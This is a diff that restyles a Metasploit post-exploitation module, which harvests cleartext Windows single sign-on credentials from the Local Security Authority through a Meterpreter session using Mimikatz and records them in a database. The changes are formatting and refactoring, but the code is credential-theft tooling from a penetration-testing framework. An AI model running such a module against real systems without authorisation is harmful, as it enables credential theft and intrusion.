@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,23 +8,21 @@ require 'msf/core'
 require 'msf/core/post/windows/priv'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Priv
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info(info,
-      'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
-      'Description'  => %q{
-        This module will collect cleartext Single Sign On credentials from the Local
-      Security Authority using the Mimikatz extension. Blank passwords will not be stored
-      in the database.
-          },
-      'License'      => MSF_LICENSE,
-      'Author'       => ['Ben Campbell'],
-      'Platform'     => ['win'],
-      'SessionTypes' => ['meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'         => 'Windows Single Sign On Credential Collector (Mimikatz)',
+                      'Description'  => %q(
+                        This module will collect cleartext Single Sign On credentials from the Local
+                      Security Authority using the Mimikatz extension. Blank passwords will not be stored
+                      in the database.
+                          ),
+                      'License'      => MSF_LICENSE,
+                      'Author'       => ['Ben Campbell'],
+                      'Platform'     => ['win'],
+                      'SessionTypes' => ['meterpreter' ]))
   end
 
   def run
@@ -34,7 +33,7 @@ class MetasploitModule < Msf::Post
 
     print_status("Running module against #{sysinfo['Computer']}")
 
-    if session.arch == ARCH_X86 and sysinfo['Architecture'] == ARCH_X64
+    if (session.arch == ARCH_X86) && (sysinfo['Architecture'] == ARCH_X64)
       print_error("x64 platform requires x64 meterpreter and mimikatz extension")
       return
     end
@@ -70,10 +69,10 @@ class MetasploitModule < Msf::Post
     res.concat client.mimikatz.ssp
     vprint_status("Retrieving LiveSSP")
     livessp = client.mimikatz.livessp
-    unless livessp.first[:password] =~ /livessp KO/
-      res.concat client.mimikatz.livessp
-    else
+    if livessp.first[:password] =~ /livessp KO/
       vprint_error("LiveSSP credentials not present")
+    else
+      res.concat client.mimikatz.livessp
     end
 
     table = Rex::Text::Table.new(
@@ -98,13 +97,13 @@ class MetasploitModule < Msf::Post
   end
 
   def report_creds(domain, user, pass)
-    return if (user.empty? or pass.empty?)
+    return if user.empty? || pass.empty?
     return if pass.include?("n.a.")
 
     # Assemble data about the credential objects we will be creating
     credential_data = {
       origin_type: :session,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       private_data: pass,
       private_type: :password,
       session_id: session_db_id,
@@ -133,7 +132,6 @@ class MetasploitModule < Msf::Post
     create_credential_login(login_data)
   end
 
-
   def is_system_user?(user)
     system_users = [
       /^$/,
@@ -150,8 +148,6 @@ class MetasploitModule < Msf::Post
       /^LOCAL SYSTEM$/
     ]
 
-    system_users.find{|r| user.to_s.match(r)}
+    system_users.find { |r| user.to_s.match(r) }
   end
-
 end
-
